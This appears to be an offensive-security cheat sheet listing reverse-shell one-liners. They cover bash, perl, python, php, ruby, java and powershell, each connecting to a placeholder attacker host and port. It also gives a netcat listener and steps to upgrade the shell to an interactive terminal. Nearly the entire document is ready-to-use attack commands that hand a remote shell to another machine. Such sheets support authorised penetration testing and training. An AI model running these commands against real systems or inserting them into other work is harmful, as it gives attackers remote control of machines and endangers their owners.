# reverse shell

%reverse shell, reverse
#platform/linux #target/local #cat/ATTACK/REVERSE_SHELL 

## bash reverse shell
```
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
```

## perl reverse shell
```
perl -e 'use Socket;$i="<lhost>";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<lhost>",<lport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## php reverse shell
```
php -r '$sock=fsockopen("<lhost>",<lport>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## ruby reverse shell
```
ruby -rsocket -e'f=TCPSocket.open("<lhost>",<lport>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## [[java]] reverse shell
```java
r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<lhost>/<lport>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()
```

## [[Arsenal/Windows/powershell]] reverse shell
```powershell
 $client = New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## windows listener autocompletion
```
rlwrap nc -nlvp <port>
```

## interactive reverse shell - and Ctrl+Z (1) 
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## interactive reverse shell - on host - and do fg (2)
```
stty raw -echo
```

## interactive reverse shell - on reverse (3)
```
reset
stty rows <ROWS> cols <COLS>
export TERM=xterm-256color
```
